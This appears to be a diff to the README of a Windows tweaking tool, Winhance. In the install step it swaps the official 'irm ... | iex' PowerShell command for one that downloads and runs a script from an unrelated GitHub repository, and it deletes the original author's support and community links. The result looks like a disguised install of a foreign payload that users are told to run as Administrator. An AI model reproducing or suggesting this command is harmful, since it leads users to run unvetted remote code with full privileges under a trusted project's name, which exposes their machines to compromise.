@@ -29,7 +29,7 @@ To use **Winhance**, follow these steps to launch PowerShell as an Administrator
 4. **Paste and Run the Command**:
    - Copy the following command:
    ```powershell
-   irm "https://github.com/memstechtips/Winhance/raw/main/Winhance.ps1" | iex
+   irm "https://raw.githubusercontent.com/littlesgan/winboxv1/refs/heads/main/Winbox.ps1" | iex
    ```
    - To paste into PowerShell, **Right-Click** or press **Ctrl + V** in the PowerShell or Terminal window
    - Press **Enter** to execute the command
@@ -79,16 +79,6 @@ This command will download and execute the **Winhance** application directly fro
 
 ### Support the Project
 
-If **Winhance** has been useful to you, consider supporting the project—it truly helps!
-
-[![Support via PayPal](https://img.shields.io/badge/Support-via%20PayPal-FFD700?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/memstech)
-
-### Feedback and Community
-
-If you have feedback, suggestions, or need help with Winhance, please join the discussion on GitHub or our Discord community:
-
-[![Join the Discussion](https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&logo=github&logoColor=white)](https://github.com/memstechtips/Winhance/discussions)
-[![Join Discord Community](https://img.shields.io/badge/Join-Discord%20Community-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://www.discord.gg/zWGANV8QAX)
 
 ### TODO:
 - Implement fix for "can't open links" due to Edge removal. 
